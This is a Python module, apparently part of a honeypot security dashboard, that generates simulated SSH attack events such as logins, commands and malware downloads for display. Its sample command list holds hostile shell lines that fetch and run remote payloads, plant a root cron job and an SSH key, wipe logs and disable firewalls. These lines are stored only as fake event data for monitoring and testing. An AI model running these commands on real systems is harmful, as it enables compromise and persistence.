import asyncio
import random
import logging
from datetime import datetime, timezone
from typing import Dict, Any

from app.database import save_event, get_summary_stats
from app.geoip import resolve_ip
from app.websocket_manager import ws_manager

logger = logging.getLogger("cowrie_soc.mock")

MOCK_BOTNET_POOLS = [
    {"ip": "185.220.101.5", "country": "Germany", "country_code": "DE", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821},
    {"ip": "45.154.255.88", "country": "Russia", "country_code": "RU", "city": "Moscow", "lat": 55.7558, "lon": 37.6173},
    {"ip": "103.145.13.24", "country": "China", "country_code": "CN", "city": "Hangzhou", "lat": 30.2741, "lon": 120.1551},
    {"ip": "194.26.29.112", "country": "United States", "country_code": "US", "city": "Los Angeles", "lat": 34.0522, "lon": -118.2437},
    {"ip": "187.189.14.77", "country": "Brazil", "country_code": "BR", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333},
    {"ip": "117.204.18.90", "country": "India", "country_code": "IN", "city": "Mumbai", "lat": 19.0760, "lon": 72.8777},
    {"ip": "14.161.40.18", "country": "Vietnam", "country_code": "VN", "city": "Ho Chi Minh City", "lat": 10.8231, "lon": 106.6297},
    {"ip": "51.15.89.201", "country": "France", "country_code": "FR", "city": "Paris", "lat": 48.8566, "lon": 2.3522},
    {"ip": "218.92.0.198", "country": "China", "country_code": "CN", "city": "Lianyungang", "lat": 34.5997, "lon": 119.2216},
    {"ip": "45.133.1.20", "country": "Netherlands", "country_code": "NL", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041},
    {"ip": "178.62.204.11", "country": "United Kingdom", "country_code": "GB", "city": "London", "lat": 51.5074, "lon": -0.1278},
    {"ip": "222.186.30.112", "country": "China", "country_code": "CN", "city": "Zhenjiang", "lat": 32.1878, "lon": 119.4258},
    {"ip": "193.32.162.45", "country": "Ukraine", "country_code": "UA", "city": "Kyiv", "lat": 50.4501, "lon": 30.5234},
    {"ip": "118.163.29.11", "country": "Taiwan", "country_code": "TW", "city": "Taipei", "lat": 25.0330, "lon": 121.5654},
    {"ip": "196.244.191.12", "country": "South Africa", "country_code": "ZA", "city": "Johannesburg", "lat": -26.2041, "lon": 28.0473},
]

MOCK_USERS = ["root", "admin", "user", "test", "ubuntu", "support", "oracle", "guest", "git", "postgres", "pi", "default"]
MOCK_PASSWORDS = ["123456", "password", "admin", "12345678", "root", "111111", "qwerty", "default", "guest", "support123", "toor", "pass1234"]

MOCK_COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo | grep 'model name' | head -n 1",
    "id; whoami",
    "curl -s http://185.220.101.5/bins/arm7 -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "wget http://91.240.118.172/mirai.x86 -O - | sh",
    "cat /etc/passwd | grep -E 'root|bash'",
    "ps aux | grep -i miner",
    "rm -rf /var/log/lastlog /var/log/wtmp; history -c",
    "crontab -l; echo '* * * * * curl -s http://evil.cc/c.sh | sh' >> /var/spool/cron/crontabs/root",
    "iptables -F; iptables -X; ufw disable",
    "cat /etc/issue; lsb_release -a",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> ~/.ssh/authorized_keys"
]

MOCK_DOWNLOADS = [
    {"url": "http://185.220.101.5/bins/arm7", "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
    {"url": "http://91.240.118.172/mirai.x86", "hash": "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"},
    {"url": "http://45.133.1.20/botnet/dropper.sh", "hash": "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"},
    {"url": "http://194.26.29.112/xmrig-x86_64.tar.gz", "hash": "c2b4c5208f2584102ffc4244ab11a3d90514a66a1c1d4285e6837ca7d5c5f8bc"},
]

class MockAttackGenerator:
    def __init__(self):
        self.is_running = False
        self._task = None

    def start(self):
        if not self.is_running:
            self.is_running = True
            self._task = asyncio.create_task(self._loop())
            logger.info("Mock attack generator started.")

    def stop(self):
        if self.is_running:
            self.is_running = False
            if self._task:
                self._task.cancel()
            logger.info("Mock attack generator stopped.")

    async def _loop(self):
        while self.is_running:
            try:
                await self.generate_single_attack()
                # Random interval between 2 and 4.5 seconds
                delay = random.uniform(2.0, 4.5)
                await asyncio.sleep(delay)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in mock generator loop: {e}")
                await asyncio.sleep(3.0)

    async def generate_single_attack(self):
        """Generate one simulated event with realistic probability."""
        target = random.choice(MOCK_BOTNET_POOLS)
        timestamp = datetime.now(timezone.utc).isoformat()
        session_id = f"sim_{random.randint(10000000, 99999999)}"

        roll = random.random()

        if roll < 0.75:
            # Login Failed (75%)
            event_type = "login_failed"
            username = random.choice(MOCK_USERS)
            password = random.choice(MOCK_PASSWORDS)
            command = None
            dl_url = None
            dl_hash = None
        elif roll < 0.88:
            # Login Success (13%)
            event_type = "login_success"
            username = random.choice(["root", "admin", "ubuntu"])
            password = random.choice(["123456", "admin", "password", "root"])
            command = None
            dl_url = None
            dl_hash = None
        elif roll < 0.96:
            # Command Execution (8%)
            event_type = "command"
            username = "root"
            password = None
            command = random.choice(MOCK_COMMANDS)
            dl_url = None
            dl_hash = None
        else:
            # File Download (4%)
            event_type = "file_download"
            username = "root"
            password = None
            command = None
            dl_item = random.choice(MOCK_DOWNLOADS)
            dl_url = dl_item["url"]
            dl_hash = dl_item["hash"]

        event_data = {
            "timestamp": timestamp,
            "session_id": session_id,
            "event_type": event_type,
            "src_ip": target["ip"],
            "src_port": random.randint(30000, 65000),
            "country": target["country"],
            "country_code": target["country_code"],
            "city": target["city"],
            "latitude": target["lat"],
            "longitude": target["lon"],
            "username": username,
            "password": password,
            "command": command,
            "download_url": dl_url,
            "download_hash": dl_hash,
            "raw_json": '{"source": "mock_generator"}'
        }

        event_id = await save_event(event_data)
        event_data["id"] = event_id

        # Broadcast event to frontend
        await ws_manager.broadcast({
            "type": "new_event",
            "data": event_data
        })

mock_generator = MockAttackGenerator()
